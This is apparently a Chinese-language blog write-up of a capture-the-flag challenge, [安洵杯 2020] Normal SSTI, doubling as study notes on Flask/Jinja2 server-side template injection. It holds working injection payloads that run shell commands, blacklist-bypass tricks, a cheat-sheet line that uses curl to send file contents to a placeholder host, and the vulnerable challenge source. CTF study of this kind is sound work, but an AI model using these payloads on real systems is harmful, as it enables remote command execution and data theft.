---
date: 2024-05-31
categories: 
    - 安洵杯
tag:
    - CTF
    - SSTI
    - flask
    - jinja2
    - python
    
---

# 每日一题 —— [安洵杯 2020]Normal SSTI

> 题目地址： <https://www.nssctf.cn/problem/910>

<!-- more -->

## SSTI 前传

在此之前，我只在 MiniL2024 的比赛中，接触过简单无过滤的、golang 的 SSTI。但是现在是比较正式的 flask+jinja2 的 SSTI。因此这篇 wp, 比起作为题解，更像是作为 SSTI 学习笔记。

## 题目分析
根据题目提示，我们需要访问 `/test/?url=xxx`，其中 `xxx` 是一个参数，会回显在屏幕上。我们根据提示，知道了这道题是 flask 的 SSTI(偷看 tag 标签)。 我们测试一下 `{{1+2}}`, 发现被过滤了。我们尝试使用 `{%print(1)%}`, 发现这个 `{%print(1)%}` 并没有被过滤。

接下来我们要进行注入了。在此之前，我需要新学习一下 SSTI 的基本方法。首先我先创建了一个基本的 flask 程序。然后让 url 直接回显在屏幕上面。现在我使用这种以下的 url 访问， 可以直接实现 RCE:

```url
http://localhost:5000/?name={{"".__class__.__bases__[0].__subclasses__()[154].__init__.__globals__['popen']('cat$IFS/flag').read()}}
```

接下来分析一下，name 参数里的意义

- "": 这个是一个字符串，它的基类是 object, 我们通过 `"".__class__.__bases__[0]` 获取到了 object。
- `__subclasses__()[154]` : 这个就是 object 的子类，我们通过 `__subclasses__()` 获取到了所有的子类。然后我们通过网页的回显可以看到一大坨子类，我们找到了一个叫 `os._wrap_close` 的子类。这个模块可以用来执行命令。我们把所有的子类都复制到编辑器里面，把所有的除了逗号以外的都删掉，然后数一下逗号的个数，发现这个模块在第 154 个。我们利用 `__subclasses__()[154]` 获取到了这个模块。
- `__init__.__globals__['popen']` : 获取到了 `os._wrap_close` 的属性。
它的下面有一个 `popen` 方法，这个方法可以执行命令。
- `'cat$IFS/flag'` : 执行命令。在这里空格是不能出现的，因为会被 urlencode 为 `%20`，因此我们需要使用 `$IFS` 来代替空格。但是其实这不是最好的方法，还有一个绕过方法，就是将引号内所有内容进行 unicode encode （注意和 urlencode 区分开来）.


来自 [CSDN博客](https://blog.csdn.net/weixin_45669205/article/details/114373785) 抄来的笔记。之后可能会专门出一节 blog 用来做 SSTI 学习。

```
__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类（除object），以元组形式，类型的实例通常没有属性。 __bases__
__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     返回这个类的所有子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以调用当前脚本中的函数，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
current_app          应用上下文，一个全局变量。

request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1   	 get传参
request.values.x1 	 所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 post传参	(Content-Type:a/b)
request.json		 post传json  (Content-Type: application/json)

config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
self.__dict__		 保存当前类实例或对象实例的属性变量键值对字典，
{%print("DMIND")%}	 控制语句中也能输出

拼接字符：{% set ind=dict(ind=a,ex=a)|join%}		变量ind=index
获取字符：{{lipsum|string|list|attr('pop')(18)}} 相当于：lipsum|string|list|attr('pop')(18)  输出：_（下划线）
得到数字：{{lipsum|string|list|attr('index')('g')}} 相当于lipsum|string|list|attr('index')('g') 输出：10
运算出其他数字：{% set shiba=ten%2bten-two %}        %2b是URL编码后的加号

得到数字：{{dict(a=a)|lower|list|count}}得到16
运算出其他数字：{{dict(aa=a)|lower|list|count-dict(a=a)|lower|list|count}}得到1

得到任意字符：{{dict(dmind=a)|slice(1)|first|first}}得到dmind

获取__builtins__属性：{{lipsum.__globals__|attr('get')('__builtins__')}}		利用get()、pop()获取属性，相当于lipsum.__globals__.get('__builtins__')

lipsum.__globals__.__builtins__  相当于  lipsum|attr('__globals__')|attr('get')('__builtins__')
lipsum.__globals__.__builtins__.chr(95)  相当于  lipsum|attr('__globals__')|attr('get')('__builtins__')|attr('get')('chr')(95)

得到chr函数：{%set chr=lipsum.__globals__.__builtins__.chr%}
利用chr()得到字符：{{chr(47)~chr(32)}}  47是/  32是空格  ~是连接符

利用os执行命令：lipsum.__globals__.os.popen('dir').read()  相当于  lipsum|attr('__globals__')|attr('get')('os')|attr('popen')('dir')|attr('read')()
类似的		  url_for['__globals__']['os']['popen']('dir').read()

简单的读取文件：url_for["__globa"+"ls__"].__builtins__.open("flag.txt").read()

在能执行eval情况下：eval(__import__('so'[::-1]).__getattribute__('syste'%2b'm')('curl http://xxx:4567?p=`cat /f*`'))
```

通篇看下来，对于这道题而言，因为使用的是 flask+jinja2, 所以还有一个更简单的 payload：
```
lipsum.__globals__['os'].popen('ls').read()
``` 
这个的原理是什么呢，我们看一下 flask 内的方法，有一个 lipsum 类，它里面有 os 模块。我们通过 `lipsum.__globals__['os']` 获取到了 os 模块，然后我们就可以使用 os 模块的 popen 方法来执行命令。

重新回到这道题，我们根据各种尝试，发现过滤了`空格`, `{{`, `[]`, `.`, 所以我们不能简单地使用这个方法。我们需要使用 `attr` 方法绕过。对于 `lipsum|attr('__globals__')`, 其实等效于 `lipsum.__globals__`，因此可以知道，attr 就是用来获取属性的。因此，我们的 payload 可以改写成 `lipsum|attr('__globals__')|attr('get')('os')|attr('popen')('ls').read()`。

最后一步，我们发现有一部分字符串被过滤了，我们就可以把引号里面的内容进行 unicode encode，最后完成命令执行.

最终 payload 如下：
```
?url={%print(lipsum|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u0067\u0065\u0074")("os")|attr("popen")("\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067")|attr("read")())%}
```
其中，命令执行的部分解码为： `cat /flag`。可以通过多次 RCE 得出最终 payload.

---
ps: 经过命令执行，我读取了他的源代码，经过一番整理如下：

```python
from flask import * 
app = Flask(__name__) 
url_black_list = ['%1c', '%1d', '%1f', '%1e', '%20', '%2b', '%2c', '%3c', '%3e'] 
black_list = ['.', '[', ']', '{{', '=', '_', '\'', '""', '\\x', 'request', 'config', 'session', 'url_for', 'g', 'get_flashed_messages', '*', 'for', 'if', 'format', 'list', 'lower', 'slice', 'striptags', 'trim', 'xmlattr', 'tojson', 'set', '=', 'chr'] 
@app.route('/', methods=['GET', 'POST']) 
def index():
    return 'try to check /test?url=xxx' 

@app.route('/test', methods=['GET']) 
def testing(): 
    url = request.url 
    for black in url_black_list:
        if black in url:
            return '<h1>do a real p1g</h1>' 
    url = request.args.get('url') 
    for black in black_list:
        if black in url: 
            return '<h1>do a real p1g</h1>' 
    return render_template_string('<h1>this is your url {}</h1>'.format(url)) 

if __name__ == '__main__': 
    app.run(host='0.0.0.0', port=8899, debug=True)
```

---
声明：本题解首次采用 vscode+comate 编写，即百度文心 AI 辅助生成。确实不错，写这篇 markdown 文件都能猜到我想要干什么。